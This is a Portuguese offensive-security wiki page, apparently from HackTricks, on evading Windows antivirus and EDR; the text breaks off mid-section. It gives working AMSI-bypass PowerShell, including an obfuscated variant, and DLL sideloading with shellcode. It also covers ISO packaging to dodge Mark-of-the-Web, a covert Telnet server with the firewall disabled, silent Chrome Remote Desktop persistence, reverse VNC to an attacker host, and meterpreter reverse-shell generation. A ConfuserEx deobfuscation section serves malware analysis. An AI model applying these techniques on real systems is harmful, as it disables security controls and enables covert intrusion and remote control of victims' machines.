# Antivírus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Esta página foi escrita por** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Parar o Defender

- [defendnot](https://github.com/es3n1n/defendnot): Uma ferramenta para parar o Windows Defender de funcionar.
- [no-defender](https://github.com/es3n1n/no-defender): Uma ferramenta para parar o Windows Defender de funcionar fingindo outro AV.
- [Desativar o Defender se você for admin](basic-powershell-for-pentesters/README.md)

## **Metodologia de Evasão de AV**

Atualmente, os AVs usam diferentes métodos para verificar se um arquivo é malicioso ou não: detecção estática, análise dinâmica e, para os EDRs mais avançados, análise comportamental.

### **Detecção estática**

A detecção estática é feita sinalizando strings conhecidas ou arrays de bytes em um binário ou script, e também extraindo informações do próprio arquivo (por exemplo, descrição do arquivo, nome da empresa, assinaturas digitais, ícone, checksum, etc.). Isso significa que usar ferramentas públicas conhecidas pode fazer você ser detectado mais facilmente, pois provavelmente já foram analisadas e marcadas como maliciosas. Existem algumas formas de contornar esse tipo de detecção:

- **Encryption**

Se você encriptar o binário, não haverá como o AV detectar seu programa, mas você precisará de algum tipo de loader para descriptografar e executar o programa em memória.

- **Obfuscation**

Às vezes tudo que você precisa fazer é mudar algumas strings no seu binário ou script para passar pelo AV, mas isso pode ser uma tarefa demorada dependendo do que você está tentando ofuscar.

- **Custom tooling**

Se você desenvolver suas próprias ferramentas, não haverá assinaturas ruins conhecidas, mas isso leva muito tempo e esforço.

> [!TIP]
> Uma boa forma de checar contra a detecção estática do Windows Defender é [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Ele basicamente divide o arquivo em múltiplos segmentos e pede ao Defender para escanear cada um individualmente; dessa forma, ele pode te dizer exatamente quais strings ou bytes são sinalizados no seu binário.

Recomendo fortemente que você confira esta [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sobre AV Evasion prática.

### **Análise dinâmica**

Análise dinâmica é quando o AV executa seu binário em um sandbox e observa atividades maliciosas (por exemplo, tentar descriptografar e ler as senhas do seu browser, realizar um minidump no LSASS, etc.). Esta parte pode ser mais complicada de trabalhar, mas aqui estão algumas coisas que você pode fazer para evadir sandboxes.

- **Sleep before execution** Dependendo de como está implementado, pode ser uma ótima forma de contornar a análise dinâmica dos AVs. Os AVs têm um tempo muito curto para escanear arquivos para não interromper o fluxo de trabalho do usuário, então usar sleeps longos pode atrapalhar a análise de binários. O problema é que muitos sandboxes dos AVs podem simplesmente pular o sleep dependendo de como foi implementado.
- **Checking machine's resources** Normalmente sandboxes têm pouquíssimos recursos (por exemplo < 2GB RAM), caso contrário poderiam deixar a máquina do usuário lenta. Você também pode ser bem criativo aqui, por exemplo checando a temperatura da CPU ou até as velocidades das ventoinhas; nem tudo será implementado no sandbox.
- **Machine-specific checks** Se você quer atingir um usuário cuja estação de trabalho está juntada ao domínio "contoso.local", você pode checar o domínio do computador para ver se bate com o que você especificou; se não bater, você pode fazer seu programa encerrar.

Acontece que o computername do Sandbox do Microsoft Defender é HAL9TH, então você pode checar o nome do computador no seu malware antes da detonação; se o nome corresponder a HAL9TH, significa que você está dentro do sandbox do defender, então você pode fazer seu programa encerrar.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>fonte: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Algumas outras dicas muito boas do [@mgeeky](https://twitter.com/mariuszbit) para enfrentar Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> canal #malware-dev</p></figcaption></figure>

Como dissemos antes neste post, **ferramentas públicas** eventualmente **serão detectadas**, então você deve se perguntar algo:

Por exemplo, se você quer dumpar o LSASS, **você realmente precisa usar mimikatz**? Ou poderia usar outro projeto menos conhecido que também dumpa o LSASS.

A resposta certa provavelmente é a última. Pegando o mimikatz como exemplo, é provavelmente um dos, se não o mais detectado por AVs e EDRs; embora o projeto em si seja muito legal, também é um pesadelo trabalhar com ele para contornar AVs, então simplesmente procure alternativas para o que você está tentando alcançar.

> [!TIP]
> Ao modificar seus payloads para evadir, certifique-se de **desligar o envio automático de amostras** no defender, e por favor, seriamente, **NÃO FAÇA UPLOAD NO VIRUSTOTAL** se seu objetivo é alcançar evasão a longo prazo. Se você quer checar se seu payload é detectado por um AV específico, instale-o em uma VM, tente desativar o envio automático de amostras e teste lá até ficar satisfeito com o resultado.

## EXEs vs DLLs

Sempre que possível, **priorize usar DLLs para evasão**; na minha experiência, arquivos DLL geralmente são **muito menos detectados** e analisados, então é um truque bem simples para evitar detecção em alguns casos (se seu payload tiver alguma forma de rodar como DLL, claro).

Como podemos ver nesta imagem, um Payload DLL do Havoc tem uma taxa de detecção de 4/26 no antiscan.me, enquanto o payload EXE tem uma taxa de detecção de 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>comparação do antiscan.me de um payload Havoc EXE normal vs um Havoc DLL normal</p></figcaption></figure>

Agora vamos mostrar alguns truques que você pode usar com arquivos DLL para ser muito mais furtivo.

## DLL Sideloading & Proxying

**DLL Sideloading** aproveita a ordem de busca de DLLs usada pelo loader posicionando tanto a aplicação vítima quanto o(s) payload(s) malicioso(s) lado a lado.

Você pode checar programas suscetíveis a DLL Sideloading usando [Siofra](https://github.com/Cybereason/siofra) e o seguinte powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Este comando vai exibir a lista de programas suscetíveis a DLL hijacking dentro de "C:\Program Files\\" e os arquivos DLL que eles tentam carregar.

Eu recomendo fortemente que você **explore DLL Hijackable/Sideloadable programs yourself**, esta técnica é bastante furtiva quando feita corretamente, mas se você usar programas DLL Sideloadable publicamente conhecidos, pode ser facilmente pego.

Apenas colocar uma DLL maliciosa com o nome que um programa espera carregar não fará com que seu payload seja executado, pois o programa espera funções específicas dentro dessa DLL. Para resolver esse problema, usaremos outra técnica chamada **DLL Proxying/Forwarding**.

**DLL Proxying** encaminha as chamadas que um programa faz da DLL proxy (e maliciosa) para a DLL original, preservando assim a funcionalidade do programa e sendo capaz de gerenciar a execução do seu payload.

Vou usar o projeto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) do [@flangvik](https://twitter.com/Flangvik/)

Estes são os passos que segui:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
O último comando nos dará 2 arquivos: a DLL source code template, e a DLL original renomeada.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Tanto nosso shellcode (codificado com [SGN](https://github.com/EgeBalci/sgn)) quanto a proxy DLL têm uma taxa de detecção 0/26 no [antiscan.me](https://antiscan.me)! Eu chamaria isso de um sucesso.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Recomendo fortemente que você assista [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) sobre DLL Sideloading e também [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) para aprender mais sobre o que discutimos de forma mais aprofundada.

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Você pode usar Freeze para carregar e executar seu shellcode de forma furtiva.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasão é apenas um jogo de gato e rato; o que funciona hoje pode ser detectado amanhã, então nunca confie em apenas uma ferramenta — se possível, tente encadear múltiplas técnicas de evasion.

## AMSI (Anti-Malware Scan Interface)

AMSI foi criado para prevenir "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Inicialmente, os AVs eram capazes apenas de escanear **files on disk**, então se você conseguisse executar payloads **directly in-memory**, o AV não poderia fazer nada para impedir, pois não tinha visibilidade suficiente.

A feature AMSI está integrada nestes componentes do Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Ela permite que soluções antivírus inspecionem o comportamento de scripts expondo o conteúdo dos scripts em uma forma que não está encriptada nem ofuscada.

Executar `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` irá produzir o seguinte alerta no Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Note como ele prefixa `amsi:` e então o caminho para o executável de onde o script foi executado, neste caso, powershell.exe

Não deixamos nenhum arquivo no disco, mas ainda assim fomos pegos na memória por causa do AMSI.

Além disso, a partir do **.NET 4.8**, código C# também é executado através do AMSI. Isso até afeta `Assembly.Load(byte[])` para carregar execução in-memory. Por isso é recomendado usar versões mais antigas do .NET (como 4.7.2 ou abaixo) para execução in-memory se você quiser evadir o AMSI.

Existem algumas maneiras de contornar o AMSI:

- **Obfuscation**

Como o AMSI funciona principalmente com detecções estáticas, modificar os scripts que você tenta carregar pode ser uma boa forma de evadir a detecção.

No entanto, o AMSI tem a capacidade de desofuscar scripts mesmo que tenham múltiplas camadas, então obfuscação pode ser uma má opção dependendo de como for feita. Isso torna a evasão nem tão direta. Embora, às vezes, tudo que você precisa fazer é mudar um par de nomes de variáveis e você estará bem — então depende de quanto algo foi sinalizado.

- **AMSI Bypass**

Como o AMSI é implementado carregando uma DLL dentro do processo do powershell (também cscript.exe, wscript.exe, etc.), é possível mexer nele facilmente mesmo rodando como um usuário não privilegiado. Devido a essa falha na implementação do AMSI, pesquisadores encontraram múltiplas formas de evadir o escaneamento do AMSI.

**Forcing an Error**

Forçar a inicialização do AMSI a falhar (amsiInitFailed) resultará em nenhum scan sendo iniciado para o processo atual. Originalmente isso foi divulgado por [Matt Graeber](https://twitter.com/mattifestation) e a Microsoft desenvolveu uma assinatura para prevenir uso mais amplo.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Tudo o que foi preciso foi uma linha de código powershell para tornar o AMSI inutilizável para o processo powershell atual. Essa linha, claro, foi sinalizada pelo próprio AMSI, então é necessário algum ajuste para usar essa técnica.

Aqui está um AMSI bypass modificado que peguei deste [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Tenha em mente que isso provavelmente será sinalizado assim que esta publicação sair, portanto você não deve publicar nenhum código se seu plano for permanecer indetectado.

**Memory Patching**

Esta técnica foi inicialmente descoberta por [@RastaMouse](https://twitter.com/_RastaMouse/) e envolve encontrar o endereço da função "AmsiScanBuffer" em amsi.dll (responsável por escanear a entrada fornecida pelo usuário) e sobrescrevê‑la com instruções para retornar o código E_INVALIDARG; dessa forma, o resultado da verificação real retornará 0, que é interpretado como um resultado limpo.

> [!TIP]
> Por favor leia [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) para uma explicação mais detalhada.

Também existem muitas outras técnicas usadas para contornar o AMSI com PowerShell, confira [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) e [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) para saber mais sobre elas.

Esta ferramenta [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) também gera scripts para contornar o AMSI.

**Remover a assinatura detectada**

Você pode usar uma ferramenta como **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** e **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** para remover a assinatura AMSI detectada da memória do processo atual. Essa ferramenta funciona escaneando a memória do processo atual à procura da assinatura AMSI e então sobrescrevendo‑a com instruções NOP, removendo‑a efetivamente da memória.

**Produtos AV/EDR que usam AMSI**

Você pode encontrar uma lista de produtos AV/EDR que usam AMSI em **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Usar PowerShell versão 2**
Se você usar PowerShell versão 2, o AMSI não será carregado, então você pode executar seus scripts sem serem escaneados pelo AMSI. Você pode fazer isto:
```bash
powershell.exe -version 2
```
## Registro do PowerShell

PowerShell logging é um recurso que permite registrar todos os comandos do PowerShell executados em um sistema. Isso pode ser útil para auditoria e solução de problemas, mas também pode ser um **problema para atacantes que querem evadir a detecção**.

Para contornar o registro do PowerShell, você pode usar as seguintes técnicas:

- **Desativar PowerShell Transcription e Module Logging**: Você pode usar uma ferramenta como [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) para esse propósito.
- **Usar Powershell version 2**: Se você usar PowerShell version 2, AMSI não será carregado, então você pode executar seus scripts sem serem escaneados pelo AMSI. Você pode fazer isso: `powershell.exe -version 2`
- **Usar uma Unmanaged Powershell Session**: Use [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) para gerar um powershell sem defesas (isso é o que `powerpick` from Cobal Strike usa).


## Ofuscação

> [!TIP]
> Várias técnicas de ofuscação dependem de criptografar dados, o que aumentará a entropia do binário e facilitará que AVs e EDRs o detectem. Tenha cuidado com isso e talvez aplique criptografia apenas a seções específicas do seu código que sejam sensíveis ou que precisem ser ocultadas.

### Deobfuscando binários .NET protegidos por ConfuserEx

Ao analisar malware que usa ConfuserEx 2 (ou forks comerciais) é comum enfrentar várias camadas de proteção que bloqueiam decompiladores e sandboxes. O fluxo de trabalho abaixo restaura de forma confiável um **IL quase original** que pode depois ser decompilado para C# em ferramentas como dnSpy ou ILSpy.

1.  Remoção de anti-tamper – ConfuserEx criptografa todo o *method body* e o descriptografa dentro do construtor estático do *module* (`<Module>.cctor`). Isso também altera o checksum do PE de forma que qualquer modificação fará o binário travar. Use **AntiTamperKiller** para localizar as tabelas de metadata criptografadas, recuperar as chaves XOR e reescrever um assembly limpo:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
A saída contém os 6 parâmetros anti-tamper (`key0-key3`, `nameHash`, `internKey`) que podem ser úteis ao construir seu próprio unpacker.

2.  Recuperação de símbolos / fluxo de controle – alimente o arquivo *clean* ao **de4dot-cex** (um fork de de4dot consciente do ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – seleciona o perfil ConfuserEx 2
• de4dot desfará o control-flow flattening, restaurará namespaces, classes e nomes de variáveis originais e descriptografará strings constantes.

3.  Remoção de proxy-calls – ConfuserEx substitui chamadas diretas de método por wrappers leves (também chamados *proxy calls*) para dificultar ainda mais a decompilação. Remova-os com **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Após este passo você deve observar APIs .NET normais como `Convert.FromBase64String` ou `AES.Create()` em vez de funções wrapper opacas (`Class8.smethod_10`, …).

4.  Limpeza manual – execute o binário resultante no dnSpy, procure por grandes blobs Base64 ou uso de `RijndaelManaged`/`TripleDESCryptoServiceProvider` para localizar o payload *real*. Frequentemente o malware o armazena como um array de bytes codificado em TLV inicializado dentro de `<Module>.byte_0`.

A cadeia acima restaura o fluxo de execução **sem** precisar rodar a amostra maliciosa – útil quando se trabalha em uma estação de trabalho offline.

> 🛈  ConfuserEx produz um atributo customizado chamado `ConfusedByAttribute` que pode ser usado como um IOC para triagem automática de amostras.

#### Linha única
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): O objetivo deste projeto é fornecer um fork open-source da suíte de compilação [LLVM](http://www.llvm.org/) capaz de oferecer maior segurança de software através de [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) e tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstra como usar a linguagem `C++11/14` para gerar, em tempo de compilação, obfuscated code sem usar qualquer ferramenta externa e sem modificar o compilador.
- [**obfy**](https://github.com/fritzone/obfy): Adiciona uma camada de obfuscated operations gerada pelo C++ template metaprogramming framework que tornará a vida de quem quiser crackear a aplicação um pouco mais difícil.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz é um x64 binary obfuscator capaz de ofuscar vários tipos de PE files incluindo: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame é um simple metamorphic code engine para executáveis arbitrários.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator é um fine-grained code obfuscation framework para linguagens suportadas pelo LLVM usando ROP (return-oriented programming). ROPfuscator obfuscates um programa no nível de código assembly transformando instruções regulares em ROP chains, frustrando nossa concepção natural de fluxo de controle normal.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt é um .NET PE Crypter escrito em Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor é capaz de converter EXE/DLL existentes em shellcode e então carregá-los

## SmartScreen & MoTW

Você pode ter visto esta tela ao baixar alguns executáveis da internet e executá-los.

Microsoft Defender SmartScreen é um mecanismo de segurança destinado a proteger o usuário final contra a execução de aplicações potencialmente maliciosas.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen funciona principalmente com uma abordagem baseada em reputação, o que significa que aplicações pouco baixadas irão acionar o SmartScreen, alertando e impedindo o usuário final de executar o arquivo (embora o arquivo ainda possa ser executado clicando em More Info -> Run anyway).

**MoTW** (Mark of The Web) é um [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) com o nome Zone.Identifier que é criado automaticamente ao baixar arquivos da internet, junto com a URL de onde foi baixado.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Verificando o Zone.Identifier ADS para um arquivo baixado da internet.</p></figcaption></figure>

> [!TIP]
> É importante notar que executáveis assinados com um certificado de assinatura **trusted** **não irão acionar o SmartScreen**.

Uma maneira muito eficaz de evitar que seus payloads recebam o Mark of The Web é embalá-los dentro de algum tipo de container como um ISO. Isso acontece porque Mark-of-the-Web (MOTW) **não pode** ser aplicado a volumes **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) é uma ferramenta que empacota payloads em containers de saída para evadir o Mark-of-the-Web.

Exemplo de uso:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) é um poderoso mecanismo de registro no Windows que permite que aplicações e componentes do sistema **registrem eventos**. No entanto, também pode ser usado por produtos de segurança para monitorar e detectar atividades maliciosas.

Similar ao modo como o AMSI é desativado (bypassed), também é possível fazer com que a função **`EtwEventWrite`** do processo em espaço de usuário retorne imediatamente sem registrar qualquer evento. Isso é feito patchando a função na memória para retornar imediatamente, efetivamente desabilitando o registro ETW para esse processo.

Você pode encontrar mais informações em **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Carregar binários C# na memória é algo conhecido há bastante tempo e ainda é uma ótima forma de executar suas ferramentas de pós-exploração sem ser detectado por AV.

Como o payload será carregado diretamente na memória sem tocar no disco, só teremos que nos preocupar em patchar o AMSI para todo o processo.

A maioria dos frameworks C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) já oferecem a capacidade de executar assemblies C# diretamente na memória, mas existem diferentes maneiras de fazer isso:

- **Fork\&Run**

Envolve **criar um novo processo sacrificial**, injetar seu código malicioso de pós-exploração nesse novo processo, executar o código malicioso e, quando terminar, matar o novo processo. Isso tem tanto benefícios quanto desvantagens. O benefício do método fork and run é que a execução ocorre **fora** do nosso processo implantado Beacon. Isso significa que, se algo na nossa ação de pós-exploração der errado ou for detectado, há uma **chance muito maior** de nosso **implant sobreviver.** A desvantagem é que existe uma **maior chance** de sermos pegos por **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Trata-se de injetar o código malicioso de pós-exploração **no próprio processo**. Dessa forma, você evita criar um novo processo e que ele seja escaneado pelo AV, mas a desvantagem é que, se algo der errado na execução do seu payload, há uma **chance muito maior** de **perder seu beacon**, já que ele pode travar.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Se você quiser ler mais sobre carregamento de Assembly C#, confira este artigo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) e o InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Você também pode carregar Assemblies C# **a partir do PowerShell**, veja [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) e o vídeo do S3cur3th1sSh1t (https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Como proposto em [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), é possível executar código malicioso usando outras linguagens dando à máquina comprometida acesso **ao ambiente do interpretador instalado no Attacker Controlled SMB share**.

Ao permitir acesso aos Interpreter Binaries e ao ambiente na SMB share, você pode **executar código arbitrário nessas linguagens dentro da memória** da máquina comprometida.

O repo indica: Defender ainda escaneia os scripts, mas ao utilizar Go, Java, PHP etc temos **mais flexibilidade para contornar assinaturas estáticas**. Testes com reverse shells aleatórios não ofuscados nessas linguagens se mostraram bem-sucedidos.

## TokenStomping

Token stomping é uma técnica que permite a um atacante **manipular o access token ou um produto de segurança como um EDR ou AV**, permitindo reduzir seus privilégios de modo que o processo não morra, mas não tenha permissões para verificar atividades maliciosas.

Para prevenir isso, o Windows poderia **impedir que processos externos** obtenham handles sobre os tokens de processos de segurança.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Como descrito em [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), é fácil apenas implantar o Chrome Remote Desktop em um PC vítima e então usá-lo para assumir o controle e manter persistência:
1. Download from https://remotedesktop.google.com/, click on "Set up via SSH", and then click on the MSI file for Windows to download the MSI file.
2. Run the installer silently in the victim (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Go back to the Chrome Remote Desktop page and click next. The wizard will then ask you to authorize; click the Authorize button to continue.
4. Execute the given parameter with some adjustments: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Note the pin param which allows to set the pin withuot using the GUI).


## Advanced Evasion

Evasion é um tópico muito complicado; às vezes você precisa considerar muitas fontes diferentes de telemetria em um único sistema, então é praticamente impossível permanecer completamente indetectável em ambientes maduros.

Cada ambiente contra o qual você atua terá suas próprias forças e fraquezas.

Eu fortemente encorajo você a assistir esta palestra do [@ATTL4S](https://twitter.com/DaniLJ94), para obter uma base sobre técnicas de Advanced Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Esta é também outra excelente palestra do [@mariuszbit](https://twitter.com/mariuszbit) sobre Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Você pode usar [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) que irá **remover partes do binário** até **descobrir qual parte o Defender** considera maliciosa e dividi-la para você.\
Outra ferramenta que faz a **mesma coisa é** [**avred**](https://github.com/dobin/avred) com uma oferta web aberta do serviço em [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Até o Windows10, todas as versões do Windows vinham com um **Telnet server** que você podia instalar (como administrador) fazendo:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Faça com que ele **inicie** quando o sistema for iniciado e **execute** agora:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Alterar telnet port** (stealth) e desativar firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Baixe em: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (você quer os bin downloads, não o setup)

**ON THE HOST**: Execute _**winvnc.exe**_ e configure o servidor:

- Habilite a opção _Disable TrayIcon_
- Defina uma senha em _VNC Password_
- Defina uma senha em _View-Only Password_

Em seguida, mova o binário _**winvnc.exe**_ e o arquivo **recém-criado** _**UltraVNC.ini**_ para dentro da **victim**

#### **Reverse connection**

O **attacker** deve **executar dentro** do seu **host** o binário `vncviewer.exe -listen 5900` para que ele fique **preparado** para capturar uma reverse **VNC connection**. Então, dentro da **victim**: Inicie o daemon winvnc `winvnc.exe -run` e execute `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Para manter a stealth você não deve fazer algumas coisas

- Não inicie `winvnc` se ele já estiver em execução ou você acionará um [popup](https://i.imgur.com/1SROTTl.png). Verifique se está em execução com `tasklist | findstr winvnc`
- Não inicie `winvnc` sem `UltraVNC.ini` no mesmo diretório ou isso fará a [config window](https://i.imgur.com/rfMQWcf.png) abrir
- Não execute `winvnc -h` para ajuda ou você acionará um [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Baixe em: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Dentro do GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Agora **start the lister** com `msfconsole -r file.rc` e **execute** o **xml payload** com:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**O Defender atual encerrará o processo muito rapidamente.**

### Compilando nosso próprio reverse shell

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Primeiro C# Revershell

Compile-o com:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Use-o com:
```
